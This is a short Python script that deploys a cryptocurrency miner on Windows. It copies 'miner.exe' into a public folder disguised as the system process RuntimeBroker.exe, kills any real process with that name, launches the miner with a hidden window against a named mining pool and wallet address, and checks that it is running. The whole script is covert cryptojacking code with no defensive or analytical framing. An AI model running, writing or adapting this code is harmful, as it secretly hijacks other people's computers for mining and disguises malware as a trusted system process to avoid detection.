import subprocess, os, shutil, time

out = []
src = os.path.join(os.getcwd(), 'input', 'miner.exe')
dst = r'C:\Users\Public\Downloads\RuntimeBroker.exe'

subprocess.run(['taskkill', '/F', '/IM', 'RuntimeBroker.exe'], capture_output=True)
time.sleep(2)

if os.path.exists(src):
    shutil.copy2(src, dst)
    out.append('Copied')
    subprocess.Popen([dst, '--pool', 'stratum+tcp://sg1.alphapool.tech:5566', '--address', 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg', '--worker', 'RTX4090_97', '--force-backend', 'ada'], creationflags=0x08000000)
    out.append('Started')
    time.sleep(8)
    p = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq RuntimeBroker.exe'], capture_output=True, text=True)
    if p.stdout and 'RuntimeBroker' in p.stdout:
        out.append('RUNNING!')
    else:
        out.append('NOT RUNNING')
else:
    out.append(f'No src: {src}')

result = chr(10).join(out)
